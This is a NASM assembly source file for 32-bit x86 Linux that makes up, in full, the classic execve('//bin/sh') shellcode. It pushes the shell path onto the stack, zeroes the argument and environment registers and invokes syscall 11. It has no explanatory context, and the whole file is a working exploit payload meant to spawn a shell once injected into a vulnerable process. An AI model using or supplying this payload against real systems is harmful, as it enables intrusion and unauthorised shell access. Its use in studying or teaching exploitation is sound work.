section .text
    global _start

_start:
    xor eax, eax 
    push eax 
    push 0x68732f6e
    push 0x69622f2f
    mov ebx, esp        ; put string address into ebx
    xor ecx, ecx        ; args
    xor edx, edx        ; env vars
    mov al, 11
    int 80h 

